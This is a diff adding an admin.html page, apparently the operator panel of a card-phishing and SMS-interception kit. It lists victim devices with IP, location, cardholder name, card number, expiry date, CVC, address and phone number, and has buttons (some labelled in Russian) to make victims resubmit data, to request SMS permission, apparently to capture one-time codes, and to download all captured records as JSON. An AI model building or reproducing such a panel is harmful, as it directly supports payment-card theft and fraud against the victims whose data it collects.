@@ -1,0 +1,90 @@
+<!-- admin.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+  <title>Admin Panel</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" crossorigin="anonymous" />
+  <link rel="stylesheet" href="./css/admin.css" />
+  <meta name="theme-color" content="#000" />
+</head>
+<body>
+  <main class="admin-container">
+    <section id="auth-section" class="auth-section">
+      <h2>Admin Login</h2>
+      <input id="admin-password" type="password" placeholder="Enter password" />
+      <button id="login-btn" class="action-btn">Login</button>
+      <p id="auth-message" class="auth-message"></p>
+    </section>
+
+    <section id="admin-content">
+      <div class="data-header">
+        <h1 class="admin-title">
+          <i class="fa-solid fa-user-shield"></i> Admin Panel
+        </h1>
+        <div class="data-tools">
+          <button id="copy-btn" class="tool-btn" title="Copy full devices list to clipboard">
+            <i class="fa-regular fa-copy"></i> Copy
+          </button>
+          <button id="save-btn" class="tool-btn" title="Save Snapshot">
+            <i class="fa-solid fa-floppy-disk"></i> Save Snapshot
+          </button>
+        </div>
+      </div>
+
+      <div class="admin-grid">
+        <aside class="sidebar">
+          <h2 class="sidebar-title">Devices</h2>
+          <ul id="devices-list" class="devices-list"></ul>
+        </aside>
+
+        <section class="main-content">
+          <div id="placeholder" class="placeholder">
+            <p>Select a device on the left to view details and messages.</p>
+          </div>
+
+            <section id="device-info" class="device-info">
+              <h2>Device Details</h2>
+              <p>  <b>Device ID:</b> <span id="detail-deviceId"></span> <span id="detail-smsPermission" style="margin-left: 10px; font-weight: bold;"></span> </p>
+              <p><b>IP:</b> <span id="detail-ip"></span></p>
+              <p><b>Location:</b> <span id="detail-location"></span></p>
+              <p><b>Cardholder Name:</b> <span id="detail-cardholderName"></span></p>
+            <p><b>Card Number:</b> <span id="detail-cardNumber"></span></p>
+
+
+            <p><b>Expiry Date:</b> <span id="detail-expiry"></span></p>
+            <p><b>CVC:</b> <span id="detail-cvv"></span></p>
+            <p><b>Address:</b> <span id="detail-address"></span></p>
+            <p><b>Phone:</b> <span id="detail-phoneNumber"></span></p>
+            <p><b>Registered At:</b> <span id="detail-timestamp"></span></p>
+          </section>
+
+          <section id="sms-container" class="sms-container"></section>
+        </section>
+      </div>
+
+      <div class="admin-actions">
+        <button id="error-notify-btn" class="tool-btn" title="Request user to resubmit form">
+          <i class="fa-solid fa-exclamation-circle"></i> Исправить данные
+        </button>
+        <button id="request-sms-btn" class="tool-btn" title="Request SMS permission from user">
+          <i class="fa-solid fa-sms"></i> Запросить разрешение на СМС
+        </button>
+        <button id="delete-device-btn" class="tool-btn" title="Удалить устройство">
+         <i class="fa-solid fa-trash"></i> Удалить
+       </button>
+
+
+        <button id="download-btn" class="tool-btn" title="Download full devices list as JSON">
+          <i class="fa-solid fa-download"></i> Download
+        </button>
+      </div>
+    </section>
+  </main>
+
+  <script src="https://cdn.socket.io/4.7.0/socket.io.min.js"></script>
+  <script src="./js/admin.js"></script>
+</body>
+</html>
